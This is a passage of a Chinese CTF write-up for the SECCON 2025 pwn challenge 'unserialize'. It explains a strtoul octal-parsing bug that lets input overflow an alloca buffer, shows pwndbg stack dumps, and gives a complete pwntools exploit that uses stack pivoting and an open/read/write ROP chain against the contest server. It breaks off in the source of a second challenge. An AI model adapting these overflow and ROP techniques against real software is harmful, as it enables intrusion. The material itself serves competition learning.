</span></span></code></pre></div><p>题目保护</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/Ubuntu_Shared_Dir/secconCTF2025/unserialize/unserialize/chall&#39;</span>
</span></span><span class=line><span class=cl>    Arch:       amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:      Partial RELRO
</span></span><span class=line><span class=cl>    Stack:      Canary found
</span></span><span class=line><span class=cl>    NX:         NX enabled
</span></span><span class=line><span class=cl>    PIE:        No PIE <span class=o>(</span>0x400000<span class=o>)</span>
</span></span><span class=line><span class=cl>    SHSTK:      Enabled
</span></span><span class=line><span class=cl>    IBT:        Enabled
</span></span><span class=line><span class=cl>    Stripped:   No
</span></span></code></pre></div><p>漏洞点在</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=n>tmpbuf</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=nf>alloca</span><span class=p>(</span><span class=nf>strtoul</span><span class=p>(</span><span class=n>szbuf</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>size_t</span> <span class=n>sz</span> <span class=o>=</span> <span class=nf>strtoul</span><span class=p>(</span><span class=n>szbuf</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>10</span><span class=p>);</span>
</span></span></code></pre></div><p><code>strtoul</code>函数用于将字符串转换成一个<code> unsigned long int</code>类型的数</p><p>其中第三个参数是<code>base</code>，输入0表示表示自动判断进制，如<code>0x</code>开头是十六进制，<code>0</code>开头但是没有<code>x</code>是八进制，非<code>0</code>开头则视为十进制</p><p>所以当我们输入<code>0256</code>时，会分配空间为<code>0256 == 174</code>的空间，但是会读入256字节大小的内容，所以造成了越界</p><p>所以越界写ROP就好了，不够长就再来个栈迁移嘛……<strong>真的是这样吗</strong></p><p>让我们在IDA里面看一下内存布局及反编译</p><p><img alt=image-20251215202634180 loading=lazy src=/posts/ctf/secconctf2025-writeup/assets/image-20251215202634180.png></p><p>这是越界写时的<code>for</code>循环，以及返回前的<code>memcpy</code>其中有用到<code>index</code>, <code>size</code>, <code>stdina</code>, <code>src</code>, <code>target</code>等局部变量，也就是说我们在越界写的过程中，会<strong>覆盖</strong>这些变量。</p><p>接下来再看看这些变量的内存布局</p><p><img alt=image-20251215203044396 loading=lazy src=/posts/ctf/secconctf2025-writeup/assets/image-20251215203044396.png></p><p>在越界写的过程中，首当其中的就是<code>target</code>变量，这决定了我们越界写的内容会被<code>memcpy</code>到什么位置，再来是<code>index</code>，<code>src</code>，<code>size</code>。</p><p><code>index</code>和<code>src</code>共同决定了我们的<strong>下一个字节</strong>会被写到什么位置，<code>size</code>决定了我们能溢出写多少字节。</p><p>看一下写了<code>0xd0</code>个A时候的内存情况</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; x/60gx 0x7ffcade16390
</span></span><span class=line><span class=cl>0x7ffcade16390:	0x4141414141414141	0x4141414141414141
</span></span><span class=line><span class=cl>0x7ffcade163a0:	0x4141414141414141	0x4141414141414141
</span></span><span class=line><span class=cl>0x7ffcade163b0:	0x4141414141414141	0x4141414141414141
</span></span><span class=line><span class=cl>0x7ffcade163c0:	0x4141414141414141	0x4141414141414141
</span></span><span class=line><span class=cl>0x7ffcade163d0:	0x4141414141414141	0x4141414141414141
</span></span><span class=line><span class=cl>0x7ffcade163e0:	0x4141414141414141	0x4141414141414141
</span></span><span class=line><span class=cl>0x7ffcade163f0:	0x4141414141414141	0x4141414141414141
</span></span><span class=line><span class=cl>0x7ffcade16400:	0x4141414141414141	0x4141414141414141
</span></span><span class=line><span class=cl>0x7ffcade16410:	0x4141414141414141	0x4141414141414141
</span></span><span class=line><span class=cl>0x7ffcade16420:	0x4141414141414141	0x4141414141414141
</span></span><span class=line><span class=cl>0x7ffcade16430:	0x4141414141414141	0x4141414141414141
</span></span><span class=line><span class=cl>0x7ffcade16440:	0x4141414141414141	0x4141414141414141
</span></span><span class=line><span class=cl>0x7ffcade16450:	0x4141414141414141	0x0041414141414141
</span></span><span class=line><span class=cl>0x7ffcade16460:	0x00007ffcade164d0<span class=o>(</span>target<span class=o>)</span>	0x00000000004ca440<span class=o>(</span>stdina<span class=o>)</span>
</span></span><span class=line><span class=cl>0x7ffcade16470:	0x0000000000000004	0x00000000000000cf<span class=o>(</span>index<span class=o>)</span>
</span></span><span class=line><span class=cl>0x7ffcade16480:	0x00007ffcade16390<span class=o>(</span>src<span class=o>)</span>	0x0000000000000100<span class=o>(</span>size<span class=o>)</span>
</span></span><span class=line><span class=cl>0x7ffcade16490:	0x00007f0036353230	0x000000000045afcb
</span></span><span class=line><span class=cl>0x7ffcade164a0:	0x0000000000000001	0x00007ffcade166f8
</span></span><span class=line><span class=cl>0x7ffcade164b0:	0x00007ffcade16708	0x43435d9e4e8fbe00<span class=o>(</span>canary<span class=o>)</span>
</span></span><span class=line><span class=cl>0x7ffcade164c0:	0x00007ffcade165e0<span class=o>(</span>saved rbp<span class=o>)</span>	0x0000000000401c1f<span class=o>(</span>saved rip<span class=o>)</span>
</span></span><span class=line><span class=cl>0x7ffcade164d0:	0x0000000000000000	0x00000000004c5ee0
</span></span><span class=line><span class=cl>0x7ffcade164e0:	0x0000000000000000	0x00000000004193ac
</span></span><span class=line><span class=cl>0x7ffcade164f0:	0x0000000000000000	0x000000003d342ff0
</span></span><span class=line><span class=cl>0x7ffcade16500:	0x00000000004ca700	0x0000000000021020
</span></span><span class=line><span class=cl>0x7ffcade16510:	0x000000003d342fe0	0x00000000004193ac
</span></span><span class=line><span class=cl>0x7ffcade16520:	0x0000000000000100	0x0000000000000000
</span></span><span class=line><span class=cl>0x7ffcade16530:	0x00007ffcade16560	0x43435d9e4e8fbe00
</span></span><span class=line><span class=cl>0x7ffcade16540:	0x000000003d342ff0	0x00000000004ca700
</span></span><span class=line><span class=cl>0x7ffcade16550:	0x0000000000000100	0x0000000000000000
</span></span><span class=line><span class=cl>0x7ffcade16560:	0x00000000004d10b0	0x43435d9e4e8fbe00
</span></span></code></pre></div><p>思路1：在本函数内ROP（<strong>X</strong>）</p><ol><li><p><code>target</code>，假如要在本函数内ROP，可以随便覆盖为<code>bss</code>上一个合法地址，不是阻碍</p></li><li><p><code>index</code></p><ol><li><p>考虑直接覆盖<code>index</code>到返回地址处？注意此时<code>index</code>已经是<code>0xcf</code>，而<code>AAAAAAAA</code>距离返回地址还有足足<code>0x70</code>，显然不行。</p></li><li><p>考虑覆盖<code>index</code>到<code>size</code>处，然后改<code>size</code>，这样就可以覆盖很多字节了，足足写好一份ROP，但是，这题有<strong>canary</strong>，这样无法绕过canary</p></li><li><p>考虑将<code>src</code>改到返回地址处，这是一个好办法，并且可以绕过canary，也可以多写挺多字节，但是再多看几次ASLR下的布局（仅<code>src</code>到<code>saved rip</code>）</p></li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> -------------------------------------------------------------
</span></span><span class=line><span class=cl> 0x7ffc2f5961f0:	0x00007ffc2f596100	0x0000000000000100
</span></span><span class=line><span class=cl> 0x7ffc2f596200:	0x00007f0036353230	0x000000000045afcb
</span></span><span class=line><span class=cl> 0x7ffc2f596210:	0x0000000000000001	0x00007ffc2f596468
</span></span><span class=line><span class=cl> 0x7ffc2f596220:	0x00007ffc2f596478	0x7df044b93da75900
</span></span><span class=line><span class=cl> 0x7ffc2f596230:	0x00007ffc2f596350	0x0000000000401c1f
</span></span><span class=line><span class=cl> -------------------------------------------------------------
</span></span><span class=line><span class=cl> 0x7ffcfbb2cd30:	0x00007ffcfbb2cc40	0x0000000000000100
</span></span><span class=line><span class=cl> 0x7ffcfbb2cd40:	0x00007f0036353230	0x000000000045afcb
</span></span><span class=line><span class=cl> 0x7ffcfbb2cd50:	0x0000000000000001	0x00007ffcfbb2cfa8
</span></span><span class=line><span class=cl> 0x7ffcfbb2cd60:	0x00007ffcfbb2cfb8	0xa1955e6370df8e00
</span></span><span class=line><span class=cl> 0x7ffcfbb2cd70:	0x00007ffcfbb2ce90	0x0000000000401c1f
</span></span><span class=line><span class=cl> -------------------------------------------------------------
</span></span><span class=line><span class=cl> 0x7ffd57b0d660:	0x00007ffd57b0d570	0x0000000000000100
</span></span><span class=line><span class=cl> 0x7ffd57b0d670:	0x00007f0036353230	0x000000000045afcb
</span></span><span class=line><span class=cl> 0x7ffd57b0d680:	0x0000000000000001	0x00007ffd57b0d8d8
</span></span><span class=line><span class=cl> 0x7ffd57b0d690:	0x00007ffd57b0d8e8	0x32db520c4fa1d400
</span></span><span class=line><span class=cl> 0x7ffd57b0d6a0:	0x00007ffd57b0d7c0	0x0000000000401c1f
</span></span></code></pre></div><p>最后3个nibble分别得<code>0x100</code>-><code>0x238</code>，<code>0xc40</code>-><code>0xd78</code>，<code>0x570</code>-><code>0x6a8</code>
也就是说我们得写4个nibble（毕竟没法写半个byte），所以得是一个<code>1/pow(2, 12)</code>爆破这并不好</p></li></ol><p>综上所述直接在本函数ROP是不可能得</p><p>思路2：在<code>main</code>函数ROP</p><ol><li><code>main</code>函数<code>buf</code>分配了<code>0x100</code>字节，直接歇逼了</li></ol><p>思路3：栈迁移</p><ol><li>覆盖<code>target</code>为<code>bss</code>地址，覆盖返回地址为<code>leave; ret</code>，但是还有一个问题就是我们怎样把输入输入到返回地址，并且绕过<code>canary</code>。直接修改<code>index</code>到返回地址是不可行的，被<code>size</code>限制了，修改<code>size</code>之后就不可避免的会改到<code>canary</code>。所以办法只有修改<code>src</code>，但是这道题栈地址的最后一个byte也会随机化，所以是1/16爆破（有时候仅最后一个字节不同，可以看上面的case）。</li></ol><p>还有一点是这题是静态编译，且没有<code>system</code>，<code>execve</code>，只能打ORW</p><p>exp</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwncli</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#context.terminal = [&#39;tmux&#39;, &#39;new-window&#39;, &#39;-n&#39;, &#39;debug&#39; ]</span>
</span></span><span class=line><span class=cl><span class=n>filename</span> <span class=o>=</span> <span class=s2>&#34;chall&#34;</span>
</span></span><span class=line><span class=cl><span class=n>libcname</span> <span class=o>=</span> <span class=s2>&#34;./libc.so.6&#34;</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;unserialize.seccon.games&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>5000</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>libcname</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>libcname</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>base</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>offset</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;canary&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>data</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>2</span><span class=p>)</span> <span class=o>-</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>base</span> <span class=o>=</span> <span class=n>data</span> <span class=o>-</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s2> = &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>base</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>format_extract</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;0x[0-9a-fA-F]</span><span class=si>{12}</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=n>base</span> <span class=o>=</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sa</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sla</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ru</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>a</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span> <span class=o>=</span> <span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_payload</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>hex_data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>length</span> <span class=o>=</span> <span class=n>length</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;ASCII&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>length</span><span class=si>}</span><span class=s2>:</span><span class=si>{</span><span class=n>hex_data</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>payload</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=c1># 转回 bytes 发送</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x100000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1>#从栈迁移到got下方</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>neg_len</span> <span class=o>=</span> <span class=mh>0x200</span>
</span></span><span class=line><span class=cl>        <span class=n>rdi_rbp_ret</span> <span class=o>=</span> <span class=mh>0x0000000000402418</span>
</span></span><span class=line><span class=cl>        <span class=n>rsi_ret</span> <span class=o>=</span> <span class=mh>0x000000000043617e</span>
</span></span><span class=line><span class=cl>        <span class=n>rdx_oral_r12_rbp_ret</span> <span class=o>=</span> <span class=mh>0x000000000049a324</span>
</span></span><span class=line><span class=cl>        <span class=c1>#x0000000000498cb8 : mov rcx, rbx ; mov edi, 1 ; call rax</span>
</span></span><span class=line><span class=cl>        <span class=n>rax_ret</span> <span class=o>=</span> <span class=mh>0x00000000004303ab</span>
</span></span><span class=line><span class=cl>        <span class=n>mprotect</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;mprotect&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=nb>open</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;open&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>read</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>write</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>ROP_chain</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=n>rdi_rbp_ret</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=mh>0x4cd000</span> <span class=o>+</span> <span class=mh>0x91</span> <span class=o>-</span> <span class=mi>6</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=n>rsi_ret</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=nb>open</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=n>rdi_rbp_ret</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span> <span class=mi>2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=n>rsi_ret</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=mh>0x4cd07f</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=n>rdx_oral_r12_rbp_ret</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=mh>0x4d0000</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=n>read</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=n>rsi_ret</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=c1>#0xd0</span>
</span></span><span class=line><span class=cl>        <span class=n>leave_ret</span> <span class=o>=</span> <span class=mh>0x401BB9</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>make_payload</span><span class=p>((</span><span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mh>0x3f</span> <span class=o>+</span> <span class=n>ROP_chain</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x91</span> <span class=o>-</span> <span class=mi>6</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;/flag</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x4cd000</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x00000000004ca440</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xe8</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x5f</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x4cd000</span> <span class=o>-</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>leave_ret</span><span class=p>)),</span> <span class=sa>b</span><span class=s1>&#39;0256&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1>#payload = make_payload((b&#39;A&#39; * 0xd0), b&#39;0256&#39;)</span>
</span></span><span class=line><span class=cl>        <span class=c1>#payload = make_payload((b&#39;A&#39; * 0xd0 + p64(0x4cd000) + p64(0x00000000004ca440)), b&#39;0256&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>payload2</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=n>rdi_rbp_ret</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span><span class=o>*</span> <span class=mi>2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=n>rsi_ret</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=mh>0x4cd07f</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=n>rdx_oral_r12_rbp_ret</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=mh>0x4d0000</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=n>read</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=n>rdi_rbp_ret</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=mh>0x4e0000</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=n>write</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>p64</span><span class=p>(</span><span class=n>rsi_ret</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>((</span><span class=n>payload</span> <span class=o>+</span> <span class=n>payload2</span><span class=p>)[:</span><span class=mh>0x100</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>((</span><span class=n>payload</span> <span class=o>+</span> <span class=n>payload2</span><span class=p>)[</span><span class=mh>0x100</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>        <span class=n>flag</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s2>&#34;{&#34;</span> <span class=ow>in</span> <span class=n>flag</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># flags.append(flag)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span> <span class=c1>#可以卡在这里</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>close</span><span class=p>()</span> <span class=c1>#关闭，然后重开</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=c1>#记录一下次数</span>
</span></span><span class=line><span class=cl>    
</span></span></code></pre></div><p><img alt=image-20251215215541722 loading=lazy src=/posts/ctf/secconctf2025-writeup/assets/image-20251215215541722.png></p><h3 id=gachiarray>gachiarray<a hidden class=anchor aria-hidden=true href=#gachiarray>#</a></h3><p>题目源码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;assert.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>union</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int32_t</span> <span class=n>capacity</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int32_t</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int32_t</span> <span class=n>initial</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int32_t</span> <span class=n>op</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int32_t</span> <span class=n>index</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int32_t</span> <span class=n>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>};</span>
